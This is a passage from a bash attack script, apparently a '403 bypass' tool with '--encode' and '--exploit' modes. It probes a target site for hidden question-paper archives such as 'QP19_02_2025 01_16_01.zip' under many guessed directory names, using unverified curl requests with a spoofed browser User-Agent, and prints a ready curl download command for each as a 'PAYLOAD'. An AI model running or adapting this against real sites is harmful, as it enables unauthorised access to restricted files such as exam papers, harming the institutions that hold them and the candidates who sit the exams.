code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TransferQPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TransferQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TransferQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print

}
function 403bypass(){ 
	URL_Encode_Bypass
}
function prg(){
	set +u
	while :;do
		case $1 in
			'-u'|'--url')
					target=$2
					path=$(echo $2 | cut -d "/" -f4- )
					domain=$(echo $2 | cut -d "/" -f3)
					shift
					;;
			## modes
			
			'--encode')
				mode='encode'
				;;
      '--exploit')
				mode='exploit'
				;;
			'-h'|'--help')
					usage
					exit 0
					;;
			"")
					shift
					break
					;;
			'*')
				 		 echo "Error: unknown: ${target}"
                         usage
                         exit 127
                         ;;
		esac
		shift
	done

	if [[ -z "${target}" ]];then
        printf "\n[${red}!${end}] ${yellow}No URL/PATH <scheme://domain.tld/path> given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi
	if [[ -z "${mode}" ]];then
        printf "\n[${red}!${end}] ${yellow}No mode given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi

	
	if [ "${mode}" == 'encode' ];then
			echo "encode"
			banner
        	URL_Encode_Bypass
        	exit 0
	elif [ "${mode}" == 'exploit' ];then
			echo "exploit"
        	banner
			403bypass
        	exit 0
	fi
}
prg $@
tput sgr0
